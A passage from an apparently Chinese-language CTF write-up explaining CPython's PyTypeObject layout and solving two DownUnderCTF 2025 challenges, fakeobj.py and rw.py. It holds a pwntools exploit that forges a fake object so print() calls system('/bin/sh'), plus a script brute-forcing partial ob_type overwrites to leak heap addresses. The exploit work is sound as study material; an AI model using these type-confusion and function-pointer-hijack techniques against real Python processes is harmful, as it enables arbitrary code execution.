中的虚函数表（vtable）。它包含了一大堆函数指针，这些指针指向了操作该类型对象的特定函数。\n\n参照：类型对象 — Python 3.10.19 文档\n\ntypedef struct _typeobject &#123;    PyObject_VAR_HEAD    const char *tp_name; /* For printing, in format &quot;&lt;module&gt;.&lt;name&gt;&quot; */    Py_ssize_t tp_basicsize, tp_itemsize; /* For allocation */    /* Methods to implement standard operations */    destructor tp_dealloc;    Py_ssize_t tp_vectorcall_offset;    getattrfunc tp_getattr;    setattrfunc tp_setattr;    PyAsyncMethods *tp_as_async; /* formerly known as tp_compare (Python 2)                                    or tp_reserved (Python 3) */    reprfunc tp_repr;    /* Method suites for standard classes */    PyNumberMethods *tp_as_number;    PySequenceMethods *tp_as_sequence;    PyMappingMethods *tp_as_mapping;    /* More standard operations (here for binary compatibility) */    hashfunc tp_hash;    ternaryfunc tp_call;    reprfunc tp_str;    getattrofunc tp_getattro;    setattrofunc tp_setattro;    /* Functions to access object as input/output buffer */    PyBufferProcs *tp_as_buffer;    /* Flags to define presence of optional/expanded features */    unsigned long tp_flags;    const char *tp_doc; /* Documentation string */    /* Assigned meaning in release 2.0 */    /* call function for all accessible objects */    traverseproc tp_traverse;    /* delete references to contained objects */    inquiry tp_clear;    /* Assigned meaning in release 2.1 */    /* rich comparisons */    richcmpfunc tp_richcompare;    /* weak reference enabler */    Py_ssize_t tp_weaklistoffset;    /* Iterators */    getiterfunc tp_iter;    iternextfunc tp_iternext;    /* Attribute descriptor and subclassing stuff */    struct PyMethodDef *tp_methods;    struct PyMemberDef *tp_members;    struct PyGetSetDef *tp_getset;    // Strong reference on a heap type, borrowed reference on a static type    struct _typeobject *tp_base;    PyObject *tp_dict;    descrgetfunc tp_descr_get;    descrsetfunc tp_descr_set;    Py_ssize_t tp_dictoffset;    initproc tp_init;    allocfunc tp_alloc;    newfunc tp_new;    freefunc tp_free; /* Low-level free-memory routine */    inquiry tp_is_gc; /* For PyObject_IS_GC */    PyObject *tp_bases;    PyObject *tp_mro; /* method resolution order */    PyObject *tp_cache;    PyObject *tp_subclasses;    PyObject *tp_weaklist;    destructor tp_del;    /* Type attribute cache version tag. Added in version 2.6 */    unsigned int tp_version_tag;    destructor tp_finalize;    vectorcallfunc tp_vectorcall;&#125; PyTypeObject;\n\n\n\n示例：str() 函数的底层调用\n当你调用 str(my_dict) 时，底层 CPython 并不会有一个独立的 str 函数来处理所有类型。相反，它会：\n\n获取 my_dict 对应的 PyObject。\n通过 ob_type 找到它的 PyTypeObject。\n在这个 PyTypeObject 中查找名为 tp_str 的函数指针。\n调用该函数指针（例如，对于字典，它指向 dict.__str__ 的具体实现）。\n将该函数的返回值作为 str() 的结果。\n\nmy_dict = &#123;&#125;my_str = &quot;hello&quot;hello = str(my_str) + str(my_dict)print(hello)\n\n你可以假设 str 只是一个独立的函数，分别以 my_str 和 my_dict 作为参数执行。这并不完全正确；与 PyTypeObjects 中的许多其他情况类似，它实际上依赖于 PyTypeObject 中存在的函数。在这种情况下， str 函数实际上将执行以下操作：\n\n前往作为参数指定的 PyObject\n\n\n从 PyObject 头部定位他们的 PyTypeObject\n\n在所述 PyTypeObject 结构中定位 tp_str 字段，然后执行该字段所指向的地址\n\n将返回值用作更高层级的 str 函数的输出\n\n\n其他内置函数如 repr()、len() 等，也是通过访问 PyTypeObject 中的相应函数指针（tp_repr, tp_as_sequence-&gt;sq_length 等）来实现的。\n二、调试 python 程序以下是配置带有 GDB 调试符号的 Python v3.10.12 安装的步骤：\nwget &#x27;https://www.python.org/ftp/python/3.10.12/Python-3.10.12.tar.xz&#x27;tar xf Python-3.10.12.tar.xzcd Python-3.10.12./configure --with-pydebugmake\n\n完成这些步骤后，就可以使用构建好的 python 二进制文件来执行所有想要的 Python 脚本。在构建的 python 二进制文件（以及它正在执行的任何脚本）上打开 GDB 将允许访问特定于 CPython 的 GDB 调试功能。\n三、部分 python 函数（一）print()及可被利用的函数指针\nprint 是一个内置函数，实现函数为 builtin_print(...)\n\nstatic PyObject *builtin_print(PyObject *self, PyObject *const *args, Py_ssize_t nargs, PyObject *kwnames)&#123;    ...    for (i = 0; i &lt; nargs; i++) &#123;        if (i &gt; 0) &#123;            if (sep == NULL)                err = PyFile_WriteString(&quot; &quot;, file);            else                err = PyFile_WriteObject(sep, file,                                         Py_PRINT_RAW);            if (err)                return NULL;        &#125;        err = PyFile_WriteObject(args[i], file, Py_PRINT_RAW);        if (err)            return NULL;    &#125;    ...&#125;\n\n在打印对象时调用 PyFile_WriteObject 函数\n/* Interfaces to write objects/strings to file-like objects */intPyFile_WriteObject(PyObject *v, PyObject *f, int flags)&#123;    PyObject *writer, *value, *result;    _Py_IDENTIFIER(write);    if (f == NULL) &#123;        PyErr_SetString(PyExc_TypeError, &quot;writeobject with NULL file&quot;);        return -1;    &#125;    writer = _PyObject_GetAttrId(f, &amp;PyId_write);    if (writer == NULL)        return -1;    if (flags &amp; Py_PRINT_RAW) &#123;        value = PyObject_Str(v);    &#125;    else        value = PyObject_Repr(v);    if (value == NULL) &#123;        Py_DECREF(writer);        return -1;    &#125;    result = PyObject_CallOneArg(writer, value);    Py_DECREF(value);    Py_DECREF(writer);    if (result == NULL)        return -1;    Py_DECREF(result);    return 0;&#125;\n\n如果flags &amp; Py_PRINT_RAW != 1，调用 PyObject_Repr 函数，其中有一行代码通过函数指针进行了调用：\nPyObject *PyObject_Repr(PyObject *v)&#123;\t...    if (v == NULL)        return PyUnicode_FromString(&quot;&lt;NULL&gt;&quot;);    if (Py_TYPE(v)-&gt;tp_repr == NULL)        return PyUnicode_FromFormat(&quot;&lt;%s object at %p&gt;&quot;,                                    Py_TYPE(v)-&gt;tp_name, v);    ...    res = (*Py_TYPE(v)-&gt;tp_repr)(v);\t...&#125;\n\n\n当 tp_repr 不为空，会进行指针调用——控制该字段可劫持执行流\n当 tp_repr 为空，会打印对象所在位置——将该字段置空可泄露地址\n\n（二）其他\n对象的 id 是一个唯一标识符，代表对象在内存中的地址：id(obj)\n\nid 是对象在内存中的唯一地址标识\nid 在对象生命周期内保持不变\nis 运算符比较的就是 id\nid 主要用于对象标识比较，而不是具体的数值\n\n\nctypes.POINTER 是 ctypes 模块中用于 创建指针类型 的工厂函数。它用于描述和操作 C 语言中的指针。\n\nIntPtr = ctypes.POINTER(ctypes.c_int)\nCharPtr = ctypes.POINTER(ctypes.c_char)\nVoidPtr = ctypes.POINTER(ctypes.c_void_p)\nPOINTER 创建的是 类型，不是实例\n使用 pointer() 或类型转换来创建指针实例\n\n\nctypes.cast() 是 Python ctypes 模块中的一个重要函数，用于 将指针转换为不同的类型。\n\nctypes.cast(obj, type)\nobj：要转换的指针对象\ntype：目标指针类型\n\n\n\n\n\n四、challenges（一）DUCTF 2025: fakeobj.py\nDownUnderCTF&#x2F;Challenges_2025_Public: Files + Solutions for DownUnderCTF 2025 Challenges\n\n#!/usr/bin/env python3import ctypesobj = &#123;&#125;print(f&quot;addrof(obj) = &#123;hex(id(obj))&#125;&quot;)libc = ctypes.CDLL(None)system = ctypes.cast(libc.system, ctypes.c_void_p).valueprint(f&quot;system = &#123;hex(system or 0)&#125;&quot;)fakeobj_data = bytes.fromhex(input(&quot;fakeobj: &quot;))for i in range(72):    ctypes.cast(id(obj), ctypes.POINTER(ctypes.c_char))[i] = fakeobj_data[i]print(obj)\n\n\n创建了一个空字典对象 obj，并返回了该对象的 id，也就是对象在内存中的地址\n通过打印了 system 函数的地址泄露 libc 基址\nctypes.cast() 是 Python ctypes 模块中的一个重要函数，用于 将指针转换为不同的类型\nctypes.POINTER 是 ctypes 模块中用于 创建指针类型 的工厂函数。它用于描述和操作 C 语言中的指针。\n即通过将 obj 的地址转化为 char 类型的指针 char*，然后向 obj 地址开始的 72 个字节填写数据\n很明显，这里的函数指针在 PyObject 对象的 ob_type 中，也就是我们能覆盖的部分区域，且参数为对象的地址：如果我们能将 tp_repr 改为 system_ptr，在对象内存开头设置 /bin/sh\\x00，就可以调用 system(&#39;/bin/sh\\x00&#39;)\n\n现在我们进行调试：\n\n\n因此可以：\n\n在 ob_refcnt 处布置’&#x2F;bin&#x2F;sh\\x00’\n覆盖 ob_type 指针，设置合适偏移，在 tp_repr 的位置上布置 system_ptr\n另外，在由于在 print 的过程中会创建关于对象的引用，因此对象的引用计数会增加（理论上在退出函数前会恢复，但是在函数退出前程序执行流就已经被劫持），所以布置’’.bin&#x2F;sh\\x00’，待调用时该字段自增变为’&#x2F;bin&#x2F;sh\\x00’\n\nfrom pwn import *context(log_level=&#x27;debug&#x27;)io = process([&quot;/.../python3&quot;, &quot;fakeobj.py&quot;])io.recvuntil(b&#x27;0x&#x27;)obj_addr = int(io.recvline(), 16)print(f&quot;obj_addr = &#123;hex(obj_addr)&#125;&quot;)io.recvuntil(b&#x27;0x&#x27;)system_addr = int(io.recvline(), 16)print(f&quot;system_addr = &#123;hex(system_addr)&#125;&quot;)payload = flat(&#123;    0x0:b&#x27;.bin/sh\\x00&#x27;,    0x8:p64(obj_addr-0x58+0x10),    0x10:p64(system_addr)&#125;,length=72,filler=b&#x27;\\x00&#x27;)# gdb.attach(io)# pause()io.sendline(payload.hex().encode())io.interactive()\n\n\n\n（二）DUCTF 2025: rw.py这一道题可以说是进阶，应用了更多的细节：\n#!/usr/bin/env python3import ctypesa = [&#123;&#125;, (), [], &quot;&quot;, 0.0]#print(&quot;id(a):&quot;+hex(id(a)))#print(&quot;id(a [0]):&quot;+hex(id(a [0])))#print(&quot;id(a [1]):&quot;+hex(id(a [1])))#print(&quot;id(a [2]):&quot;+hex(id(a [2])))#print(&quot;id(a [3]):&quot;+hex(id(a [3])))#print(&quot;id(a [4]):&quot;+hex(id(a [4])))#print(&quot;id(a)-id(a [0]):&quot;+hex(id(a)-id(a [0])))#print(&quot;id(a)-id(a [1]):&quot;+hex(id(a)-id(a [1])))#print(&quot;id(a)-id(a [2]):&quot;+hex(id(a)-id(a [2])))#print(&quot;id(a)-id(a [3]):&quot;+hex(id(a)-id(a [3])))#print(&quot;id(a)-id(a [4]):&quot;+hex(id(a)-id(a [4])))while True:    try:        inp = input(&quot;&gt; &quot;)        cmd, idx, *val = inp.split()        idx = int(idx)        match cmd:            case &quot;r&quot;:                print(a[idx])            case &quot;w&quot;:                ctypes.cast(                    id(a) + idx, ctypes.POINTER(ctypes.c_char)                )[0] = int(val[0])            case _:                break    except Exception as e:        print(&quot;error:&quot;, e)\n\n直接学习官方的 wp（更重要的是，在早期尝试时发现一些偏移并非固定，遂没有想法，而 wp 显示在远程环境一些偏移是固定的），为了叙事上的连贯性，笔者将从一个解题者的思路开始讲起。首先分析一下这个简单的 python 代码：\n\n创建了一个列表对象 a，内含多个对象，包括字典、元组、列表、字符串和数。\n在一个循环中处理 r(read)、w(write) 请求：\nr 可打印列表 a 的成员\nw 可直接对 a 所在的地址+offset 的内存写数据\n\n\n\n存在一个任意地址写，但是我们仍需要泄露一些信息。\n\n任意地址写是对相对于 a 的偏移的内存进行的。为此，如果一些内存中一些关键数据和对象 a 的偏移固定，那我们就可以稳定进行修改内存加以利用。利用 arbitrary_write 显然是第一步可做的事情。连续运行几次，发现对象 a 与 a[0] 的偏移基本固定——大多数情况是 0x63030\nid(a):0x762213be0fa0id(a[0]):0x762213b7df70id(a[1]):0x762213e84250id(a[2]):0x762213bf3f70id(a[3]):0x762213e88040id(a[4]):0x762213f145e0id(a)-id(a[0]):0x63030id(a)-id(a[1]):-0x2a32b0id(a)-id(a[2]):-0x12fd0id(a)-id(a[3]):-0x2a70a0id(a)-id(a[4]):-0x333640--------------------------------id(a):0x749154fe0fa0id(a[0]):0x749154f7df70id(a[1]):0x749155904250id(a[2]):0x749154ff3f70id(a[3]):0x749155908040id(a[4]):0x7491559945e0id(a)-id(a[0]):0x63030id(a)-id(a[1]):-0x9232b0id(a)-id(a[2]):-0x12fd0id(a)-id(a[3]):-0x9270a0id(a)-id(a[4]):-0x9b3640--------------------------------id(a):0x77955bbe4ff0id(a[0]):0x77955bb81fd0id(a[1]):0x77955be8c250id(a[2]):0x77955bbf7f70id(a[3]):0x77955be90040id(a[4]):0x77955bf1c5e0id(a)-id(a[0]):0x63020id(a)-id(a[1]):-0x2a7260id(a)-id(a[2]):-0x12f80id(a)-id(a[3]):-0x2ab050id(a)-id(a[4]):-0x3375f0--------------------------------id(a[0]):0x77955bb81fd0id(a[1]):0x77955be8c250id(a[2]):0x77955bbf7f70id(a[3]):0x77955be90040id(a[4]):0x77955bf1c5e0id(a)-id(a[0]):0x63020id(a)-id(a[1]):-0x2a7260id(a)-id(a[2]):-0x12f80id(a)-id(a[3]):-0x2ab050id(a)-id(a[4]):-0x3375f0--------------------------------id(a):0x76765dde0fa0id(a[0]):0x76765dd7df70id(a[1]):0x76765e704250id(a[2]):0x76765ddf3f70id(a[3]):0x76765e708040id(a[4]):0x76765e7945e0id(a)-id(a[0]):0x63030id(a)-id(a[1]):-0x9232b0id(a)-id(a[2]):-0x12fd0id(a)-id(a[3]):-0x9270a0id(a)-id(a[4]):-0x9b3640--------------------------------id(a):0x74b63dbe0fa0id(a[0]):0x74b63db7df70id(a[1]):0x74b63e504250id(a[2]):0x74b63dbf3f70id(a[3]):0x74b63e508040id(a[4]):0x74b63e5945e0id(a)-id(a[0]):0x63030id(a)-id(a[1]):-0x9232b0id(a)-id(a[2]):-0x12fd0id(a)-id(a[3]):-0x9270a0id(a)-id(a[4]):-0x9b3640\n\n由 wp 知远程的环境内存偏移是固定的：\n\n# DIST_FROM_a offsets may depend on the exact python environment! \n# debug the python process running inside nsjail to get the correct offsets\n\n本地起一个 docker 环境验证偏移，确实偏移较为固定：\ncd srcdocker build -t rw_py .docker run -d \\  --privileged \\  --cap-add=SYS_ADMIN \\  --security-opt apparmor=unconfined \\  --tmpfs /tmp \\  -p 1337:1337 \\  rw_pydocker start [container hash]docker exec -it [container hash] /bin/bashroot@34fe368f500a:/home/ctf/chal# ./pwnid(a):0x748081611640id(a[0]):0x7480815a5d40id(a[1]):0x7480816c8070id(a[2]):0x7480815f06c0id(a[3]):0x7480816cc030id(a[4]):0x748081564cb0id(a)-id(a[0]):0x6b900id(a)-id(a[1]):-0xb6a30id(a)-id(a[2]):0x20f80id(a)-id(a[3]):-0xba9f0id(a)-id(a[4]):0xac990&gt; ^CTraceback (most recent call last):  File &quot;/home/ctf/chal/./pwn&quot;, line 19, in &lt;module&gt;    inp = input(&quot;&gt; &quot;)KeyboardInterruptroot@34fe368f500a:/home/ctf/chal# ./pwnid(a):0x7d40a52116c0id(a[0]):0x7d40a51a5d00id(a[1]):0x7d40a52cc070id(a[2]):0x7d40a51f0780id(a[3]):0x7d40a52d0030id(a[4]):0x7d40a5164cb0id(a)-id(a[0]):0x6b9c0id(a)-id(a[1]):-0xba9b0id(a)-id(a[2]):0x20f40id(a)-id(a[3]):-0xbe970id(a)-id(a[4]):0xaca10&gt; ^CTraceback (most recent call last):  File &quot;/home/ctf/chal/./pwn&quot;, line 19, in &lt;module&gt;    inp = input(&quot;&gt; &quot;)KeyboardInterruptroot@34fe368f500a:/home/ctf/chal# ./pwnid(a):0x7329ef6b9640id(a[0]):0x7329ef64dd40id(a[1]):0x7329ef770070id(a[2]):0x7329ef6986c0id(a[3]):0x7329ef774030id(a[4]):0x7329ef60ccb0id(a)-id(a[0]):0x6b900id(a)-id(a[1]):-0xb6a30id(a)-id(a[2]):0x20f80id(a)-id(a[3]):-0xba9f0id(a)-id(a[4]):0xac990\n\n因此，为方便学习，我们在原 rw.py 程序中固定输出 id(a)-id(a[0]) 的值，假定该值恒定；同时为了调试方便，输出 id(a) 的值，当然，该值只用于调试索引，仍需要进行显式的地址泄露：\npwndbg&gt; p *(PyObject*)0x75461e1f3b60$1 = &#123;  ob_refcnt = 1,  ob_type = 0x5f1b112b57c0 &lt;PyList_Type&gt;&#125;pwndbg&gt; p *(PyListObject*)0x75461e1f3b60$2 = &#123;  ob_base = &#123;    ob_base = &#123;      ob_refcnt = 1,      ob_type = 0x5f1b112b57c0 &lt;PyList_Type&gt;    &#125;,    ob_size = 5  &#125;,  ob_item = 0x75461e1d1c80,  allocated = 5&#125;pwndbg&gt; p *(PyObject*)(0x75461e1f3b60-0x75bf0)$3 = &#123;  ob_refcnt = 1,  ob_type = 0x5f1b112b7820 &lt;PyDict_Type&gt;&#125;pwndbg&gt; \n\n现在我们可以做到稳定的修改 a[0] 的相关结构体成员。\n我们知道 print 函数实际上是 builtin_print 基于对象 ob_type 相关信息输出内容的，让我们再次回顾一下 print 函数打印对象时的相关过程：\n// print(obj) -&gt; builtin_print -&gt; PyFile_WriteObject -&gt; PyObject_Repr -&gt; PyObject_Repr(PyObject *v)&#123;\t...    if (v == NULL)        return PyUnicode_FromString(&quot;&lt;NULL&gt;&quot;);    if (Py_TYPE(v)-&gt;tp_repr == NULL)        return PyUnicode_FromFormat(&quot;&lt;%s object at %p&gt;&quot;,                                    Py_TYPE(v)-&gt;tp_name, v);    ...&#125;\n\n当 ob_type-&gt;tp_repr==NULL 时，将打印对象的地址——这就给我们造成了泄露的机会。然而，我们只能在没有地址信息的情况下修改 a[0] 对象的 ob_type，而无法直接修改 ob_type-&gt;tp_repr——是否可以通过写 ob_type，使得 tp_repr 域对应的内存为 NULL 呢？或许在调用链过程中会做一些检查，使得调用中断，但是我们可以一试！\n让我们先用 gdb 调试一下，手动覆写为 NULL，验证泄露的可行性：\npwndbg&gt; b builtin_printBreakpoint 1 at 0x62726ab4c7ea: file Python/bltinmodule.c, line 1949.pwndbg&gt; p *(PyObject*)0x7f99585f7b60$1 = &#123;  ob_refcnt = 1,  ob_type = 0x62726ad077c0 &lt;PyList_Type&gt;&#125;pwndbg&gt; p *(PyListObject*)(0x7f99585f7b60)$2 = &#123;  ob_base = &#123;    ob_base = &#123;      ob_refcnt = 1,      ob_type = 0x62726ad077c0 &lt;PyList_Type&gt;    &#125;,    ob_size = 5  &#125;,  ob_item = 0x7f99585d5c80,  allocated = 5&#125;pwndbg&gt; p *(PyDictObject*)(0x7f99585f7b60-0x75bf0)$3 = &#123;  ob_base = &#123;    ob_refcnt = 1,    ob_type = 0x62726ad09820 &lt;PyDict_Type&gt;  &#125;,  ma_used = 0,  ma_version_tag = 14975,  ma_keys = 0x62726ad08940 &lt;empty_keys_struct&gt;,  ma_values = 0x62726ad30578 &lt;empty_values&gt;&#125;pwndbg&gt; set (PyTypeObject*)0x62726ad09820-&gt;tp_new_tp_new_methoddef  tp_new_wrapper    pwndbg&gt; set ((PyTypeObject*)0x62726ad09820)-&gt;tp_repr = 0pwndbg&gt; p ((PyTypeObject*)0x62726ad09820)-&gt;tp_repr$4 = (reprfunc) 0x0pwndbg&gt; cContinuing.--------------------&gt; $ r 0[DEBUG] Sent 0x4 bytes:    b&#x27;r 0\\n&#x27;[DEBUG] Received 0x22 bytes:    b&#x27;&lt;dict object at 0x7f9958581f70&gt;\\n&#x27;    b&#x27;&gt; &#x27;&lt;dict object at 0x7f9958581f70&gt;\n\n可行！现在我们用 gdb 覆盖 a[0] 对象 ob_type 指针的最低一字节为 \\x00：\npwndbg&gt; p *(PyObject*)0x74ee817f7a20$1 = &#123;  ob_refcnt = 1,  ob_type = 0x5dce4facc7c0 &lt;PyList_Type&gt;&#125;pwndbg&gt; p *(PyObject*)(0x74ee817f7a20-0x75a50)$2 = &#123;  ob_refcnt = 1,  ob_type = 0x5dce4face820 &lt;PyDict_Type&gt;&#125;pwndbg&gt; set ((PyObject*)(0x74ee817f7a20-0x75a50))-&gt;ob_type = 0x5dce4face800pwndbg&gt; p *(PyObject*)(0x74ee817f7a20-0x75a50)$3 = &#123;  ob_refcnt = 1,  ob_type = 0x5dce4face800 &lt;PyDictIterKey_Type+384&gt;&#125;pwndbg&gt; cContinuing.Program received signal SIGSEGV, Segmentation fault.\n\n崩了，我们更改偏移试一试，写个循环爆一爆\nfrom pwn import *# context(log_level = &quot;debug&quot;)for i in range(0, 0xff, 0x8):    io = process([&quot;python3&quot;,&quot;rw.py&quot;])    io.recvuntil(b&quot;id(a):0x&quot;)    a_addr = int(io.recvline().strip(), 16)    io.recvuntil(b&quot;id(a)-id(a[0]):0x&quot;)    a0_addr = a_addr - int(io.recvline().strip(), 16)    success(f&quot;a_addr: &#123;hex(a_addr)&#125;&quot;)    success(f&quot;a0_addr: &#123;hex(a0_addr)&#125;&quot;)    gdb.attach(io,f&quot;set *(char*)(&amp;(((PyObject*)(&#123;hex(a0_addr)&#125;))-&gt;ob_type)) = &#123;hex(i)&#125;\\nc&quot;)    print(hex(i))    io.sendlineafter(b&quot;&gt; &quot;, b&quot;r 0&quot;)    io.interactive()    io.close()--------------------[+] Waiting for debugger: Done0x58[*] Switching to interactive modeFatal Python error: _Py_CheckFunctionResult: a function returned NULL without setting an exceptionPython runtime state: initializedSystemError: &lt;built-in function print&gt; returned NULL without setting an exceptionCurrent thread 0x00007c7a90b01740 (most recent call first):  File &quot;/.../rw.py&quot;, line 24 in &lt;module&gt;$ [*] Interrupted[*] Stopped process &#x27;/.../python3&#x27; (pid 13342)[+] Starting local process &#x27;/*/python-3.10.12-install/bin/python3&#x27;: pid 13487[+] a_addr: 0x71e6295f3b60[+] a0_addr: 0x71e62957df70[*] running in new terminal: [&#x27;/usr/bin/gdb&#x27;, &#x27;-q&#x27;, &#x27;/.../python3&#x27;, &#x27;13487&#x27;, &#x27;-x&#x27;, &#x27;/tmp/pwnlib-gdbscript-ls7j54_1.gdb&#x27;][+] Waiting for debugger: Done0x60[*] Switching to interactive mode[*] Got EOF while reading in interactive$ [*] Interrupted[*] Process &#x27;/.../python3&#x27; stopped with exit code -11 (SIGSEGV) (pid 13487)[+] Starting local process &#x27;/.../python3&#x27;: pid 13653[+] a_addr: 0x7bf8da1f3a20[+] a0_addr: 0x7bf8da17dfd0[*] running in new terminal: [&#x27;/usr/bin/gdb&#x27;, &#x27;-q&#x27;, &#x27;/.../python3&#x27;, &#x27;13653&#x27;, &#x27;-x&#x27;, &#x27;/tmp/pwnlib-gdbscript-lyd8w3za.gdb&#x27;][+] Waiting for debugger: Done0x68[*] Switching to interactive mode&lt; object at 0x7bf8da17dfd0&gt;&gt; $  \n\n在 0x68 的时候成功泄露出对象的地址信息，经测试，对于 本题目，在 我使用的环境下，0x68 能够稳定 leak 而不崩溃。\n\n经过比较，0x68 相对于原有的新增偏移 0x48\n进一步我对()、[]、”” 也做了测试：\n\n对于元组()对象的 ob_type 偏移粗略遍历没有泄露，不过我遍历的范围有限\n某偏移使得列表 [] 对象也能泄露\n\n\n\n\n对于字符串 “” 对象，某偏移会报错同时重复输出地址，对于程序每次运行时偏移不变的相关题目有所帮助：\n\n\n\n基于上述信息：利用部分覆写 ob_type 造成结构体偏移从而 leak 的方法是较为通用的，具体的偏移值还是在具体的题目中调试为妙\n\nok，探索就先到这里，我们继续做题：现在已经 leak 出对象在程序中的地址，这是一个 堆地址。接下来尝试泄露程序基址。\na 对象是一个列表，让我们回顾一下列表对象 PyListObject 的构成：\ntypedef struct &#123;    PyVarObject ob_base; // 包含 PyObject 和 ob_size    PyObject **ob_item;   // 指向列表元素指针数组的指针    Py_ssize_t allocated; // 列表实际分配的内存空间&#125; PyListObject;---------------------------------------------pwndbg&gt; p *(PyListObject*)0x78763a5f35c0$1 = &#123;  ob_base = &#123;    ob_base = &#123;      ob_refcnt = 1,      ob_type = 0x643bfa5117c0 &lt;PyList_Type&gt;    &#125;,    ob_size = 5  &#125;,  ob_item = 0x78763a5dde00,  allocated = 5&#125;pwndbg&gt; p ob_itemNo symbol &quot;ob_item&quot; in current context.pwndbg&gt; tele 0x78763a5dde0000:0000│  0x78763a5dde00 —▸ 0x78763a57deb0 ◂— 101:0008│  0x78763a5dde08 —▸ 0x78763a890250 ◂— 0x58a02:0010│  0x78763a5dde10 —▸ 0x78763a5ce850 ◂— 103:0018│  0x78763a5dde18 —▸ 0x78763a894040 ◂— 0x3f /* &#x27;?&#x27; */04:0020│  0x78763a5dde20 —▸ 0x78763a9205b0 ◂— 305:0028│  0x78763a5dde28 ◂— 0xfdfdfdfdfdfdfdfd06:0030│  0x78763a5dde30 ◂— 0x220000000000000007:0038│  0x78763a5dde38 ◂— 0xfdfdfdfdfdfdfd6f\n\n在 print(a[idx]) 的时候，首先依据下标从 ob_item 找到对应打印的元素，然后执行后续的打印操作。ob_item 也是一个指向堆地址的指针，而此时我们已经泄露出堆地址，因此我们是否可以修改 a 对象的 ob_item 来实现泄露呢？可以一试——但是改为什么值呢。\nPython 高级语言的一个重要的特性是：一切都是对象——这为潜在的类型混淆攻击提供了便利。\n我们注意到，所有对象类都继承自 PyObject，包括 类型对象——全局对象，存储在 BSS 段\n对于 a=[&#123;&#125;,(),[],&quot;&quot;,0.0]，a[0] 类型为字典，其 ob_type 指针指向 字典对象 TypeDict_Type，经过调试可以鲜明看到这种关系：\n\n\npwndbg&gt; p PyDict_Type $3 = &#123;抽吃随的  ob_base = &#123;    ob_base = &#123;      ob_refcnt = 42,      ob_type = 0x630342dcbec0 &lt;PyType_Type&gt;    &#125;,    ob_size = 0  &#125;,  tp_name = 0x630342c7e7a6 &quot;dict&quot;,  tp_basicsize = 48,  tp_itemsize = 0,  tp_dealloc = 0x630342a6a686 &lt;dict_dealloc&gt;,  tp_vectorcall_offset = 0,  tp_getattr = 0x0,  tp_setattr = 0x0,  tp_as_async = 0x0,  tp_repr = 0x630342a6d9ea &lt;dict_repr&gt;,  tp_as_number = 0x630342dc47a0 &lt;dict_as_number&gt;,  tp_as_sequence = 0x630342dc48c0 &lt;dict_as_sequence&gt;,  tp_as_mapping = 0x630342dc4910 &lt;dict_as_mapping&gt;,  tp_hash = 0x630342a782b9 &lt;PyObject_HashNotImplemented&gt;,  tp_call = 0x0,  tp_str = 0x630342a8c12b &lt;object_str&gt;,  tp_getattro = 0x630342a7c0ef &lt;PyObject_GenericGetAttr&gt;,  tp_setattro = 0x630342a7c564 &lt;PyObject_GenericSetAttr&gt;,  tp_as_buffer = 0x0,  tp_flags = 541611328,  tp_doc = 0x630342cc7fe0 &lt;dictionary_doc&gt; &quot;dict() -&gt; new empty dictionary\\ndict(mapping) -&gt; new dictionary initialized from a mapping object&#x27;s\\n    (key, value) pairs\\ndict(iterable) -&gt; new dictionary initialized as if via:\\n    d = &#123;&#125;\\n    for k, &quot;...,  tp_traverse = 0x630342a674c6 &lt;dict_traverse&gt;,  tp_clear = 0x630342a6d75c &lt;dict_tp_clear&gt;,  tp_richcompare = 0x630342a69134 &lt;dict_richcompare&gt;,  tp_weaklistoffset = 0,  tp_iter = 0x630342a698d9 &lt;dict_iter&gt;,  tp_iternext = 0x0,  tp_methods = 0x630342dc59c0 &lt;mapp_methods&gt;,  tp_members = 0x0,  tp_getset = 0x0,  tp_base = 0x630342dcbd20 &lt;PyBaseObject_Type&gt;,  tp_dict = 0x7eb1b6ad0ef0,  tp_descr_get = 0x0,  tp_descr_set = 0x0,  tp_dictoffset = 0,  tp_init = 0x630342a6fba2 &lt;dict_init&gt;,  tp_alloc = 0x630342a8fa82 &lt;PyType_GenericAlloc&gt;,  tp_new = 0x630342a6c40e &lt;dict_new&gt;,  tp_free = 0x630342b4d610 &lt;PyObject_GC_Del&gt;,  tp_is_gc = 0x0,  tp_bases = 0x7eb1b6a9adf0,  tp_mro = 0x7eb1b6a9ae40,  tp_cache = 0x0,  tp_subclasses = 0x7eb1b6ae7b30,  tp_weaklist = 0x7eb1b6ad1c70,  tp_del = 0x0,  tp_version_tag = 11,  tp_finalize = 0x0,  tp_vectorcall = 0x630342a6f95f &lt;dict_vectorcall&gt;&#125;\n可以看到，tp_dict 字段是一个堆地址，他和python中dict对象的__dict__方法有关系吗？瞅瞅源码\n//------------------------------------------// Objects/dictobject.c//------------------------------------------PyDoc_STRVAR(dictionary_doc,&quot;dict() -&gt; new empty dictionary\\n&quot;&quot;dict(mapping) -&gt; new dictionary initialized from a mapping object&#x27;s\\n&quot;&quot;    (key, value) pairs\\n&quot;&quot;dict(iterable) -&gt; new dictionary initialized as if via:\\n&quot;&quot;    d = &#123;&#125;\\n&quot;&quot;    for k, v in iterable:\\n&quot;&quot;        d[k] = v\\n&quot;&quot;dict(**kwargs) -&gt; new dictionary initialized with the name=value pairs\\n&quot;&quot;    in the keyword argument list.  For example:  dict(one=1, two=2)&quot;);PyTypeObject PyDict_Type = &#123;    PyVarObject_HEAD_INIT(&amp;PyType_Type, 0)    &quot;dict&quot;,    sizeof(PyDictObject),    0,    (destructor)dict_dealloc,                   /* tp_dealloc */    0,                                          /* tp_vectorcall_offset */    0,                                          /* tp_getattr */    0,                                          /* tp_setattr */    0,                                          /* tp_as_async */    (reprfunc)dict_repr,                        /* tp_repr */    &amp;dict_as_number,                            /* tp_as_number */    &amp;dict_as_sequence,                          /* tp_as_sequence */    &amp;dict_as_mapping,                           /* tp_as_mapping */    PyObject_HashNotImplemented,                /* tp_hash */    0,                                          /* tp_call */    0,                                          /* tp_str */    PyObject_GenericGetAttr,                    /* tp_getattro */    0,                                          /* tp_setattro */    0,                                          /* tp_as_buffer */    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC |        Py_TPFLAGS_BASETYPE | Py_TPFLAGS_DICT_SUBCLASS |        _Py_TPFLAGS_MATCH_SELF | Py_TPFLAGS_MAPPING,  /* tp_flags */    dictionary_doc,                             /* tp_doc */    dict_traverse,                              /* tp_traverse */    dict_tp_clear,                              /* tp_clear */    dict_richcompare,                           /* tp_richcompare */    0,                                          /* tp_weaklistoffset */    (getiterfunc)dict_iter,                     /* tp_iter */    0,                                          /* tp_iternext */    mapp_methods,                               /* tp_methods */    0,                                          /* tp_members */    0,                                          /* tp_getset */    0,                                          /* tp_base */    0,                                          /* tp_dict */    0,                                          /* tp_descr_get */    